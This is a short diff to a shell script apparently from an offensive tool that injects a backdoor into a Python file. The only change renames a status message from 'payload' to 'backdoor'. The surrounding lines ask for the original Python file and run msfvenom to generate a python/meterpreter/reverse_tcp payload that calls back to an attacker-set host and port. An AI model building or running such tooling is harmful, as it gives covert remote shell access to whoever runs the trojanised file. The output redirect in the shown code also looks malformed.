@@ -11,7 +11,7 @@ echo ""
 read -p "[ + ] path to Original File [ PYTHON ] : " pyfile
 echo ""
 sleep 0.5
-echo "[ * ] Generating the payload ..." | pv -qL 10
+echo "[ * ] Generating the backdoor ..." | pv -qL 10
 echo ""
 xterm -T "Creating Payload ..." -e "msfvenom -p python/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -o temp.txt" & > /dev/null2>&1
 PID=$!
